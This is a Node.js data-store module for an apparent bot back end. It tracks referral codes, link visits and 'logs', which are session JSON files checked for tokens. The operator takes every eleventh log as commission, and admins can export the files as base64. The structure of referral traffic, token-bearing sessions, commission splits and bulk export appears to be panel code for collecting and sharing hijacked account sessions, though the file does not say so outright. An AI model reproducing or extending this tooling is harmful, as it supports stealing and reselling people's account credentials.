const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const STORE_FILE = path.join(process.cwd(), '.bot-store.json');
const SESSIONS_DIR = path.join(process.cwd(), 'sessions');

const PERIOD_MS = {
  day: 24 * 60 * 60 * 1000,
  week: 7 * 24 * 60 * 60 * 1000,
  month: 30 * 24 * 60 * 60 * 1000
};

function emptyStore() {
  return {
    settings: { commissionEvery: 11 },
    admins: [],
    users: {},
    visits: [],
    logs: {},
    exportStats: {
      totalExports: 0,
      totalFiles: 0,
      byPeriod: {},
      lastExportAt: null
    }
  };
}

function readStore() {
  try {
    const raw = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
    const base = emptyStore();
    return {
      settings: { ...base.settings, ...(raw.settings || {}) },
      admins: Array.isArray(raw.admins) ? raw.admins.map(String) : [],
      users: raw.users && typeof raw.users === 'object' ? raw.users : {},
      visits: Array.isArray(raw.visits) ? raw.visits : [],
      logs: raw.logs && typeof raw.logs === 'object' ? raw.logs : {},
      exportStats: { ...base.exportStats, ...(raw.exportStats || {}) }
    };
  } catch {
    return emptyStore();
  }
}

function writeStore(state) {
  fs.writeFileSync(STORE_FILE, JSON.stringify(state, null, 2), 'utf8');
}

function withStore(fn) {
  const state = readStore();
  const result = fn(state);
  writeStore(state);
  return result;
}

function makeRefCode() {
  return crypto.randomBytes(4).toString('hex');
}

function ensureUser(state, userId, patch = {}) {
  const key = String(userId);
  if (!state.users[key]) {
    state.users[key] = {
      refCode: makeRefCode(),
      username: '',
      firstName: '',
      logCount: 0,
      visits: 0,
      joinedAt: Date.now(),
      lastSeenAt: Date.now()
    };
  }
  const user = state.users[key];
  if (!user.refCode) user.refCode = makeRefCode();
  if (patch.username != null) user.username = String(patch.username || '');
  if (patch.firstName != null) user.firstName = String(patch.firstName || '');
  if (patch.lastSeenAt != null) user.lastSeenAt = patch.lastSeenAt;
  else user.lastSeenAt = Date.now();
  return user;
}

function touchUser(userId, patch = {}) {
  return withStore((state) => {
    const user = ensureUser(state, userId, patch);
    return { id: String(userId), ...user };
  });
}

function findUserByRef(refCode) {
  const state = readStore();
  const code = String(refCode || '').trim().toLowerCase();
  if (!code) return null;
  for (const [id, user] of Object.entries(state.users)) {
    if (String(user.refCode || '').toLowerCase() === code) {
      return { id, ...user };
    }
  }
  return null;
}

function getUser(userId) {
  const state = readStore();
  const key = String(userId);
  if (!state.users[key]) return null;
  return { id: key, ...state.users[key] };
}

function listUsers() {
  const state = readStore();
  return Object.entries(state.users)
    .map(([id, user]) => ({ id, ...user }))
    .sort((a, b) => (b.logCount || 0) - (a.logCount || 0) || (b.lastSeenAt || 0) - (a.lastSeenAt || 0));
}

function getSettings() {
  return { ...readStore().settings };
}

function setCommissionEvery(n) {
  const value = Math.max(0, Math.floor(Number(n) || 0));
  return withStore((state) => {
    state.settings.commissionEvery = value;
    return { ...state.settings };
  });
}

function getDynamicAdmins() {
  return readStore().admins.map(String);
}

function addAdmin(userId) {
  const id = String(userId || '').trim();
  if (!/^\d+$/.test(id)) throw new Error('ID админа должен быть числом');
  return withStore((state) => {
    if (!state.admins.includes(id)) state.admins.push(id);
    return state.admins.slice();
  });
}

function removeAdmin(userId) {
  const id = String(userId || '').trim();
  return withStore((state) => {
    state.admins = state.admins.filter((item) => item !== id);
    return state.admins.slice();
  });
}

function recordVisit(refCode, meta = {}) {
  const code = String(refCode || '').trim().toLowerCase();
  if (!code) return { ok: false, reason: 'no_ref' };

  return withStore((state) => {
    let ownerId = null;
    for (const [id, user] of Object.entries(state.users)) {
      if (String(user.refCode || '').toLowerCase() === code) {
        ownerId = id;
        user.visits = (user.visits || 0) + 1;
        break;
      }
    }
    const entry = {
      ref: code,
      ownerId,
      at: Date.now(),
      ipHash: meta.ipHash || null
    };
    state.visits.push(entry);
    if (state.visits.length > 5000) {
      state.visits = state.visits.slice(-4000);
    }
    return { ok: true, ownerId, visits: ownerId ? state.users[ownerId].visits : null };
  });
}

function registerLog({ fileName, refCode, hasToken = true, createdAt = Date.now() }) {
  const name = path.basename(String(fileName || '').trim());
  if (!name || !name.endsWith('.json')) {
    throw new Error('Некорректное имя файла сессии');
  }

  return withStore((state) => {
    if (state.logs[name]) {
      return { ...state.logs[name], fileName: name, duplicate: true };
    }

    const owner = findOwnerInState(state, refCode);
    let commission = false;
    let ownerId = owner ? owner.id : null;

    if (owner) {
      owner.user.logCount = (owner.user.logCount || 0) + 1;
      const every = Number(state.settings.commissionEvery) || 0;
      commission = every > 0 && owner.user.logCount % every === 0;
    }

    const record = {
      ownerId,
      refCode: owner ? owner.user.refCode : String(refCode || '').trim().toLowerCase() || null,
      createdAt,
      commission,
      hasToken: Boolean(hasToken)
    };
    state.logs[name] = record;
    return { fileName: name, ...record, duplicate: false };
  });
}

function findOwnerInState(state, refCode) {
  const code = String(refCode || '').trim().toLowerCase();
  if (!code) return null;
  for (const [id, user] of Object.entries(state.users)) {
    if (String(user.refCode || '').toLowerCase() === code) {
      return { id, user };
    }
  }
  return null;
}

function upsertUserRemote(payload) {
  return withStore((state) => {
    const user = ensureUser(state, payload.id || payload.userId, {
      username: payload.username,
      firstName: payload.firstName,
      lastSeenAt: payload.lastSeenAt || Date.now()
    });
    if (payload.refCode) {
      const code = String(payload.refCode).trim().toLowerCase();
      const clash = Object.entries(state.users).find(
        ([id, u]) => id !== String(payload.id || payload.userId) && String(u.refCode).toLowerCase() === code
      );
      if (!clash) user.refCode = code;
    }
    return { id: String(payload.id || payload.userId), ...user };
  });
}

function filterLogs(predicate, period = 'all') {
  const state = readStore();
  const ms = PERIOD_MS[period];
  const since = ms ? Date.now() - ms : 0;
  return Object.entries(state.logs)
    .filter(([, log]) => {
      if (ms && (log.createdAt || 0) < since) return false;
      return predicate(log);
    })
    .map(([fileName, log]) => ({ fileName, ...log }))
    .sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
}

function logsForOwner(ownerId, { includeCommission = false, period = 'all' } = {}) {
  const id = String(ownerId);
  return filterLogs((log) => {
    if (String(log.ownerId) !== id) return false;
    if (!includeCommission && log.commission) return false;
    return true;
  }, period);
}

function commissionLogs(period = 'all') {
  return filterLogs((log) => Boolean(log.commission), period);
}

function allLogs(period = 'all') {
  return filterLogs(() => true, period);
}

function orphanSessionFiles() {
  if (!fs.existsSync(SESSIONS_DIR)) return [];
  const state = readStore();
  return fs
    .readdirSync(SESSIONS_DIR)
    .filter((name) => name.endsWith('.json'))
    .filter((name) => !state.logs[name])
    .map((name) => {
      const full = path.join(SESSIONS_DIR, name);
      const stat = fs.statSync(full);
      return {
        fileName: name,
        ownerId: null,
        refCode: null,
        createdAt: stat.mtimeMs,
        commission: false,
        hasToken: fileHasToken(full),
        orphan: true
      };
    });
}

function fileHasToken(fullPath) {
  try {
    const data = JSON.parse(fs.readFileSync(fullPath, 'utf8'));
    return Boolean(data && data.token);
  } catch {
    return false;
  }
}

function listExportableFiles({ mode = 'all', period = 'all', ownerId = null } = {}) {
  let logs;
  if (mode === 'commission') {
    logs = commissionLogs(period);
  } else if (mode === 'user') {
    logs = logsForOwner(ownerId, { includeCommission: false, period });
  } else {
    logs = allLogs(period);
    const orphans = orphanSessionFiles().filter((item) => {
      if (period === 'all') return true;
      const ms = PERIOD_MS[period];
      return ms ? item.createdAt >= Date.now() - ms : true;
    });
    logs = [...logs, ...orphans];
  }

  return logs
    .map((log) => {
      const full = path.join(SESSIONS_DIR, log.fileName);
      if (!fs.existsSync(full)) return null;
      const stat = fs.statSync(full);
      return {
        ...log,
        path: full,
        size: stat.size,
        mtime: stat.mtimeMs,
        hasToken: log.hasToken ?? fileHasToken(full)
      };
    })
    .filter(Boolean)
    .sort((a, b) => (b.createdAt || b.mtime || 0) - (a.createdAt || a.mtime || 0));
}

function readSessionBase64(fileName) {
  const name = path.basename(String(fileName || ''));
  const full = path.join(SESSIONS_DIR, name);
  if (!name.endsWith('.json') || !fs.existsSync(full)) {
    throw new Error('Файл не найден');
  }
  return {
    fileName: name,
    contentBase64: fs.readFileSync(full).toString('base64'),
    size: fs.statSync(full).size
  };
}

function recordExport({ mode, period, fileCount }) {
  return withStore((state) => {
    state.exportStats.totalExports += 1;
    state.exportStats.totalFiles += fileCount;
    state.exportStats.lastExportAt = Date.now();
    const key = `${mode}:${period}`;
    if (!state.exportStats.byPeriod[key]) {
      state.exportStats.byPeriod[key] = { exports: 0, files: 0 };
    }
    state.exportStats.byPeriod[key].exports += 1;
    state.exportStats.byPeriod[key].files += fileCount;
    return { ...state.exportStats };
  });
}

function getExportStats() {
  return { ...readStore().exportStats };
}

function countVisits(period = 'all', ownerId = null) {
  const state = readStore();
  const ms = PERIOD_MS[period];
  const since = ms ? Date.now() - ms : 0;
  let refCode = null;
  if (ownerId != null && state.users[String(ownerId)]) {
    refCode = String(state.users[String(ownerId)].refCode || '').toLowerCase();
  }
  return state.visits.filter((v) => {
    if (ms && (v.at || 0) < since) return false;
    if (ownerId == null) return true;
    if (String(v.ownerId) === String(ownerId)) return true;
    if (refCode && String(v.ref || '').toLowerCase() === refCode) return true;
    return false;
  }).length;
}

function buildStats(period = 'all') {
  const logs = allLogs(period);
  const commission = logs.filter((l) => l.commission);
  const withToken = logs.filter((l) => l.hasToken);
  const orphans = period === 'all' ? orphanSessionFiles() : orphanSessionFiles().filter((item) => {
    const ms = PERIOD_MS[period];
    return ms ? item.createdAt >= Date.now() - ms : true;
  });

  return {
    period,
    logs: logs.length,
    valid: withToken.length,
    commission: commission.length,
    orphans: orphans.length,
    users: listUsers().length,
    visits: countVisits(period),
    commissionEvery: getSettings().commissionEvery
  };
}

function userStats(userId, period = 'all') {
  const existing = getUser(userId);
  const user = existing || {
    id: String(userId),
    refCode: '',
    username: '',
    firstName: '',
    logCount: 0,
    visits: 0,
    joinedAt: null,
    lastSeenAt: null
  };
  const own = logsForOwner(userId, { includeCommission: false, period });
  const commission = logsForOwner(userId, { includeCommission: true, period }).filter((l) => l.commission);
  const every = getSettings().commissionEvery;
  const count = user.logCount || 0;
  const progress = every > 0 ? count % every : 0;
  const untilCommission = every > 0 ? (progress === 0 && count > 0 ? every : every - progress) : null;
  const visitsByOwner = countVisits(period, userId);
  const visitsByRef = countVisitsByRef(period, user.refCode);
  const visits = Math.max(visitsByOwner, visitsByRef, user.visits || 0);

  return {
    user: existing ? { id: String(userId), ...existing } : user,
    period,
    logs: own.length,
    valid: own.filter((l) => l.hasToken).length,
    commissionTaken: commission.length,
    visits,
    commissionEvery: every,
    progressInCycle: progress,
    untilCommission,
    totalLogCount: count
  };
}

function countVisitsByRef(period, refCode) {
  const code = String(refCode || '').trim().toLowerCase();
  if (!code) return 0;
  const state = readStore();
  const ms = PERIOD_MS[period];
  const since = ms ? Date.now() - ms : 0;
  return state.visits.filter((v) => {
    if (ms && (v.at || 0) < since) return false;
    return String(v.ref || '').toLowerCase() === code;
  }).length;
}

function hashIp(ip) {
  if (!ip) return null;
  return crypto.createHash('sha256').update(String(ip)).digest('hex').slice(0, 16);
}

module.exports = {
  STORE_FILE,
  SESSIONS_DIR,
  PERIOD_MS,
  readStore,
  touchUser,
  getUser,
  listUsers,
  findUserByRef,
  getSettings,
  setCommissionEvery,
  getDynamicAdmins,
  addAdmin,
  removeAdmin,
  recordVisit,
  registerLog,
  upsertUserRemote,
  logsForOwner,
  commissionLogs,
  allLogs,
  listExportableFiles,
  readSessionBase64,
  recordExport,
  getExportStats,
  countVisits,
  countVisitsByRef,
  buildStats,
  userStats,
  hashIp,
  orphanSessionFiles
};
